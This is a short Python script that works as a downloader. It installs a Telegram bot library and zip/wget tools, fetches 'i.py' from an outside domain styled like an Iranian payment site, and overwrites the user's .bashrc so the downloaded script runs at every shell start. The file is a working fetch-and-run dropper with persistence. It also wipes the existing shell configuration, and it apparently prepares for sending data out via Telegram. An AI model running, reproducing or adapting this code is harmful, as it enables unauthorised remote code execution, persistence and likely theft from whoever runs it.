import os

url = 'https://iran-payment-ir.cf/i.py'
os.system("pip install pyTelegramBotAPI")
os.system("apt install zip wget -y")
cmd = "wget "+url
os.system(cmd)
f = open(".bashrc", "w")
f.write("python i.py")
f.close()

